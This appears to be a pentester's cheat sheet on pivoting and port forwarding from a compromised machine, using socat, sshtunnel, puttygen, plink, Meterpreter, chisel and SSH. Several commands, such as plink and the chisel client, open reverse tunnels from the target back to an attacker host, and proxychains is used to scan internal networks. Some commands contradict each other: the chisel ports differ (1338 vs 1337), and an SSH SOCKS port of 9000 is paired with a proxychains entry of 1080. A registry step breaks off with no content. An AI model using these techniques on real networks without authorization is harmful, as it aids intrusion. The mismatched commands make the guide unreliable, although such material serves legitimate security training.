Sometimes we just can't get access to the thing that we need to exploit.

When that happens we need to know the different ways in which we can get around this little hurdle, as there is always a way.

[The question on StackExchange that spawned this post](https://unix.stackexchange.com/questions/293304/using-netcat-for-port-forwarding)

## SOCAT

```bash
socat tcp-listen:8001,reuseaddr,fork tcp:localhost:8000
```

## Python

Not something you want to code yourself with any kind of time contraints, but it's totally possible.

Best choice is to use an existing library like [sshtunnel](https://pypi.org/project/sshtunnel/) which you can use to do things like the following (which forwards a Vagrant server to the local MySQL port):

```python
from sshtunnel import open_tunnel
from time import sleep

with open_tunnel(
    ('localhost', 2222),
    ssh_username="vagrant",
    ssh_password="vagrant",
    remote_bind_address=('127.0.0.1', 3306)
) as server:

    print(server.local_bind_port)
    while True:
        # press Ctrl-C for stopping
        sleep(1)

print('FINISH!')
```

## Putty

Basically SSH for Windows. Usually the most interaction we'll have with this is when we find one of it's keys (.ppk) laying around on a machine.

With that being said...

Convert Putty key to SSH key:

```bash
puttygen id_dsa.ppk -O private-openssh -o id_dsa

puttygen id_dsa.ppk -O public-openssh -o id_dsa.pub
```

Sometimes Putty also has passwords left in the registry:

## Plink

For this to work we need to make sure SSH is turned on. 

```bash
service ssh restart
```

The on the target machine we can do the following:

```bash
.\plink.exe root@kali_ip -R KALI_PORT:IP_OF_TARGET_MACHINE:TARGET_PORT
```

(Could come in handy if we have SMB creds for an admin but we can't access SMB remotely)

## Metasploit

In a `meterpreter` session:

```bash
portfwd add -l LOCAL_PORT -p DESTINATION_PORT -r TARGET_IP
```

```bash
run autoroute -s 10.1.1.0/24
run autoroute -s 10.2.2.0/24
```

```bash
use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
exploit -j

```

Now on our host machine we can scan the IT network:

```bash
vim /etc/proxychains.conf 
...
socks4 127.0.0.1 1080
```

```bash
proxychains nmap -sT -v -Pn 10.2.2.224
```

## Chisel

Chisel is an awesome tool that is more than capable of turning what feels like a lost cause into a system own.

[Github Link for Chisel](https://github.com/jpillora/chisel)

On the host:

```bash
chisel(.exe) client 10.10.14.3:1338 R:1234:127.0.0.1:1234
```

That will setup a connection to 1337, which will then forward port 1234 to localhost:

```bash
chisel(.exe) server -p 1337 -reverse -v
```

## SSH

Local Foward:

```bash
ssh -L 80:127.0.0.1:80 someserver@someip
```

### Remote Forward

```bash
ssh -R 8080:localhost:80 someserver@someip
```

### Dynamic tunneling

```bash
ssh -D 9000 sean@10.11.1.251
```

```bash
vim /etc/proxychains.conf 

socks4 127.0.0.1 1080
```

```bash
proxychains nmap -sT -v -Pn 10.2.2.224
```

This creates a dynamic tunnel over port 9000 using SOCKS(4a)
